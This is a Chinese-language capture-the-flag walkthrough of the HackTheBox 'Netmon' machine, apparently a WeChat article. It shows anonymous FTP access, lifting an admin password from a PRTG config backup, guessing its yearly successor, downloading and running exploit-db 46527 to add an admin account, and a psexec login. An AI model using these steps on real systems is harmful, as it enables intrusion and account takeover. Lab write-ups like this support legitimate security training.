> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/8qRY_IOlkUdXXpwJVx5zZw)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzPibicnUiaVZPG1ln1jKWdm0HtEXpECzSYIv7HhXvMcWSWknJhaiabC3dCA/640?wx_fmt=png)

靶机信息
----

靶机地址:

```
 https://app.hackthebox.com/machines/Netmon
```

靶场: HackTheBox.com

靶机名称: Netmon

难度: 简单

提示信息:

```
 无
```

目标: user.txt 和 root.txt

实验环境
----

```
 攻击机:Manjaro 10.10.16.3
 
 靶机:10.10.10.152
```

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
 sudo nmap -p- 10.10.10.152
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCz27MHlrqs5ibBsszy0icibNIBeN6fIIISWkuNaqTB7G5479bUT9bUKzVew/640?wx_fmt=png)

```
 sudo nmap -sC -sV -p- 10.10.10.152 -oN nmap.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzu7jiajOuibiaXEfhpxLL8IcZT43z00xyBPevTVInn4INWOHfia2w77JiaNg/640?wx_fmt=png)

扫描到多个开放端口，21(FTP) 端口允许匿名访问先来看看 21 端口

### FTP 收集信息

```
 ftp 10.10.10.152
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzEChfSic8DuqFq8WssvCzo8TeicXibicPOu3F8ibIC0o8d20DUsIkMC96ROA/640?wx_fmt=png)

登录成功，查看文件内容发现 FTP 的根目录是在 C 盘的根目录上，继续收集信息

```
 cd users/public
 ls
 get user.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzwIbc8mWBZVxIDT3fx62AI2ADYqWpCmWnN7fNkcyMZqyvnP3RMd9ia3Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzSrELtIqsgwouU3pHle89DNbA6MmnLe8RFgwiaRMQI4FRoEicrGvIsPhQ/640?wx_fmt=png)

在 users/public 目录下顺利拿到第 1 个 flag，继续收集

```
 cd C:\"Program Files (x86)"
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCztfTVdZOmLnRhFuZBoZ1rTdP4ZicD2oP9Wz1JJ8WuckFFXuuS3NzYhDg/640?wx_fmt=png)

在 x86 程序目录下发现 PRTG Network Monitor 程序，在 nmap 扫描结果中 80 端口同样有这个名称，通过搜索引擎查看是什么程序

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzF2dqfbB4PqyV4nCd9Dx70HU0I9g2A8Vib6YLOicxcU9uIbeT4e9zfmug/640?wx_fmt=png)

百科发现是网管程序，进入程序目录搜集信息

```
 cd "PRTG Network Monitor"
 ls
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzPMPxlkhYOUtUYNqlxHCRKlKN47PdGbRjO34HhrJDmC9Yj1mVDdyR0w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzh6N2icFsxG5l8yR54DdWHWrRueBEFlj20SiaibHqYia6WmueicfkZfVmlQw/640?wx_fmt=png)

发现该程序有 web 目录，检查后未发现有敏感信息，继续找

```
 cd /
 ls -al
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzchbmmmAD5VUUw3oxUo4EiaqwsCdKWHmc7POo4UwNUsYad7CyXAJlxjw/640?wx_fmt=png)

根目录下使用 ls 命令加上参数 - al 查看隐藏目录，继续搜集

```
 cd "PRTG Network Monitor"
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzlUuhTeC0kLBPYQXOSZzOD40jCPSRpgSGYHibyWJq1GnjW7OOUzj2MlA/640?wx_fmt=png)

发现配置文件备份，下载下来

```
 get "PRTG Configuration.old.bak"
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzppuLRkC3O9uLtT2Ta1KKJ32vDPWBbdj2qBwzJeIw5Dia7AXcBspeTvg/640?wx_fmt=png)

查看内容

```
 cat PRTG\ Configuration.old.bak
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzATLfMIcOSqpL3icVFBrIWwKXmmuWqGKoHwX4sEj1sPuatfnBgxH19Yw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzah2s2c3HA8dFCHELpBRIolVzLOtGdJYIt1JmOXufRWVdSjicPdoGADQ/640?wx_fmt=png)

拿到管理员账号密码，尝试登录 web

Web 攻击
------

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzgXMcRoczQ7WHl8tJaANJkqK9uLWuTj1n5se7PjpwLMESZtgWwib6JUQ/640?wx_fmt=png)

访问后来到登录页面，尝试登录

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzdPswHqQTHVt95Hsq5Kjtwf1vIzicaVTtMwWkiaibIlic4s5jysJXdlyGug/640?wx_fmt=png)

登陆失败，再来看看其他文件内容

```
 cat PRTG\ Configuration.dat
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzJPjzgaRc7sibZvzXKBwBlpMrg3u222wFBKXvrEo0YTkCKtwWlJTTynw/640?wx_fmt=png)

```
 cat PRTG\ Configuration.old
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzJPjzgaRc7sibZvzXKBwBlpMrg3u222wFBKXvrEo0YTkCKtwWlJTTynw/640?wx_fmt=png)

另外两个配置文件中并没有保存密码，继续找

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzHCicctgFhR0CVOGaicDJhWyljZwldy4o99yLibpSicOFsgsWyj0oYwLib7Q/640?wx_fmt=png)

在文件日期中发现备份文件是在 2018 年 7 月 14 日备份的，然而当前使用的文件日期是 2019 年 2 月 25 日。旧密码为 PrTg@dmin2018 管理员使用了当前年份做为密码，如果到了 2019 年密码会不会修改为 PrTg@dmin2019，验证一下。

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzs05rxKNiaHthABVOQVLAANgLYDGtfBXXjr3CtQdSQfJTic6sW8x20wJA/640?wx_fmt=png)

登录成功，并且在页面中发现程序版本为 18.1.37.13946，来找找这个版本是否存在漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzRw1rOrkKibeicIRDjGSG8a5u6N21uqj8PNfzDUCIrH1zE3N3JKlUcucw/640?wx_fmt=png)

发现一个高于当前版本的 RCE(远程代码执行) 漏洞，来验证下是否可用

```
 wget https://www.exploit-db.com/download/46527 -O exp
 chmod +x exp
 ./exp
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzhbHEK2kMPiaHPCyafEib6CLJ7ozrXwltP0jHWutwnJ0iaXQhVoHER1wZg/640?wx_fmt=png)

exp 无法执行，exploit-db 经常会出现这类情况，只需要手动将代码 copy 下来即可

```
 rm exp
 vim exp
 chmod +x exp
 ./exp
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzPUfNvPI4FEM8ibEetVcOTyDNoTdibG55HZF8Pf7QFlmMdHtfWh3LmJqw/640?wx_fmt=png)

exp 中提示当你执行脚本后会在靶机上创建一个名为 pentest 的管理员账号，密码是 P3nT3st!。并且提示执行 exp 需要两个参数地址和 cookie。来验证下

先到 F12 中找到 cookie

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzzvIicPHNsT6BR41PBgTKCqlmQoO5DNC0Z2fRDeaWrApcp5OQicER72YA/640?wx_fmt=png)

执行 exp

```
 ./exp -u http://10.10.10.152 -c 'OCTOPUS1813713946=e0QyRUVGNUQzLTFGMTEtNEMxNi1BMERCLTI3QzBCMUFGREQ0N30%3D'
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzzHTib175vpKgfozzW936xubPloygfiboSjhCBcia6iar6GYwmWQ8LW9QjA/640?wx_fmt=png)

创建用户成功，现在使用 Impacket 中的 psexec.py 脚本登录

Impacket 仓库地址

```
 https://github.com/SecureAuthCorp/impacket
```

```
 psexec.py pentest:'P3nT3st!'@10.10.10.152
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCz0LpjY9vlaYO9iatS1zFA6IbQOEI7MORiad8hYNicatFwee35esYUZibZXQ/640?wx_fmt=png)

登录成功，找下最后的 flag

```
 cd c:\users\administrator
 tree /f
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCz6lwibicB5HyrUDLGSR4kvpw6gp2R8Q76n4FqRtGomPxRaFCTso1YXoNg/640?wx_fmt=png)

在 administraotr 用户的桌面上发现 root.txt 文件，获取 flag

```
 type desktop\root.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzUhSAM9sAruC0AKVsiacOxTxdt5GEKwkqolHZybKwHia7YV59ABd9s0eA/640?wx_fmt=png)

拿到 root.txt，游戏结束

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzzhufoYK6wGPysbh6hl3TFYh8JicrASRsUN4WrWgIMm7MhRLKaNWgobw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzSwXibicBoROXmYOzURT8kldL2ibJAuExf6hK8OLffmwJbMZdLRwNy4svA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/7gUQD4TbLUvCicjdrRIZ7y5XibWEePezCzAg1bt6MH7YLJhmmGjuuWKp4kXd9oPqpOQ1xN3JIDfyeT9Jm8GXYVzg/640?wx_fmt=jpeg)